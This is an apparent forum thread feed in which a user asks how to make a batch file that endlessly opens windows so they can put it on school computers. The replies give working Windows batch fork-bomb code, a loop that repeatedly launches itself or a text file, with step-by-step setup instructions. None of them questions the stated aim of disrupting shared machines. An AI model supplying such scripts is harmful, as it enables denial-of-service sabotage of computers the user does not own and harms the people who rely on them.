channel.title: How do i make something open over and over?
channel.description:
my brother made something in notepad and it opened up thousand and thousands of other nnote pad files.
it was like @echo off something something @go to end
and it opened the things in the folder.
can someone help me make this so i can put it on the school computers?

item.title: How do i make something open over and over?
item.dc:creator: @frank frank_
item.description:
@frank wrote:

make a file called lol.bat

:start
start lol
goto start

forkbomb owns you

Read full topic
item.source: How do i make something open over and over?

item.title: How do i make something open over and over?
item.dc:creator: @marluxia marluxia
item.description:
@marluxia wrote:

@echo off :end start .\lol.txt Goto end

a little correctment

Read full topic
item.source: How do i make something open over and over?

item.title: How do i make something open over and over?
item.dc:creator: @LegendaryLoser .Flair
item.description:
@LegendaryLoser wrote:

Open NotePad

type

:end 
@start .\lol.txt
@Goto end

Make a new folder

Save it there as lol.bat

Open NotePad again

Save it as lol in the folder you made

Open lol.bat

There

Read full topic
item.source: How do i make something open over and over?
